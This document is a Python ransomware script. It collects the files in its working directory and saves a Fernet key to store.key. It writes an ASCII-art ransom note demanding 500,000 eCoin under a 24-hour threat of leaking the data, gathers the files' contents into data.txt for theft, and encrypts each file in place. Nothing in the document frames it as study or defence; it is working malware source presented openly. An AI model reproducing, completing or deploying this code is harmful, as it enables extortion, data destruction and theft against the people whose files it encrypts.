import os
from cryptography.fernet import Fernet
from art import *
from time import sleep
from termcolor import colored

files = []

key = Fernet.generate_key()


for file in os.listdir():
    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "after_ransom_is_given_run_this.sh" or file == "run_this.sh" or file == "scaredstraight.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("store.key", "wb") as thekey:
    thekey.write(key)





note = """
                                                                          ._                                            ,
                                                                            (`)..                                    ,.-')
                                                                            (',.)-..                            ,.-(..`)         
                                                                              (,.' ,.)-..                    ,.-(. `.. )                    
                                                                              (,.' ..' .)-..            ,.-( `.. `.. )                     
                                                                                (,.' ,.'  ..')-.     ,.-( `. `.. `.. )                      
                                                                                (,.'  ,.' ,.'  )-.-('   `. `.. `.. )                       
                                                                                  ( ,.' ,.'    _== ==_     `.. `.. )                        
                                                                                  ( ,.'   _==' ~  ~  `==_    `.. )                     
                                                                                    \  _=='   ----..----  `==_   )                     
                                                                                ,.-:    ,----___.  .___----.    -..                        
                                                                            ,.-'   (   _--====_  \/  _====--_   )  `-..                 
                                                                        ,.-'   .__.'`.  `-_I0_-'    `-_0I_-'  .'`.__.  `-..     
                                                                    ,.-'.'   .'      (          |  |          )      `.   `.-..  
                                                                ,.-'    :    `___--- '`.__.    / __ \    .__.' `---___'    :   `-..      
                                                              -'_________`-____________'__ \  (O)  (O)  / __`____________-'________`-     
                                                                                          \ . _  __  _ . /                               
                                                                                            \ `V-'  `-V' |                                 
                                                                                            | \ \ | /  /                                 
                                                                                              V \ ~| ~/V                                   
                                                                                              |  \  /|                                    
                                                                                                \~ | V                                 
                                                                                                \  |                                        
                                                                                                  VV

                                                                            Wire 500.000 eCoin to the following account:
                                                                    [ACCOUNT LINK - PREFERABLY .onion LINK AND ENCRYPTED ACCOUNT]
                                                                                                    
                                                                                   No police. No Feds. Just you.

                                                         if the requirements are not met before 24 hours have passed, all your data will be leaked.
                                                                                              Be smart.
                                                                           
                                                                                                  """

with open("ransom_note.txt", "w") as ransom_note:
    ransom_note.write(note)

for file in files:
    with open(file, "r") as data_for_snatch:
        snatched_data = data_for_snatch.read()
    with open("data.txt", "a") as payload:
        payload.write(snatched_data)


for file in files:
    with open(file, "rb") as target_data:
        contents = target_data.read()
        contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as target_data:
        target_data.write(contents_encrypted)
